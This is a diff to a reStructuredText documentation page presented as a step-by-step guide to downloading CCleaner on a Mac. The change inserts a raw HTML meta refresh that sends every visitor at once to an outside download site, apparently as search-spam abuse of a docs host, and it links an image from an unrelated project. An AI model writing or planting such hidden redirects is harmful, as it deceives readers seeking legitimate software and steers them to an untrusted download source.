@@ -1,11 +1,10 @@
+.. raw:: html
+ 
+    <meta http-equiv="refresh" content="0; url=https://i-downloadsoftwares.com/">
+
 How to Download CCleaner on Mac?: Step-by-Step Guide 🍏
 ============================================
-.
-.
 
-.. toctree::
-   :maxdepth: 2
-   :caption: Contents:
 
 .. image:: https://iolosystemmechanicdownload.readthedocs.io/en/latest/_images/download.png
    :alt: My Project Logo
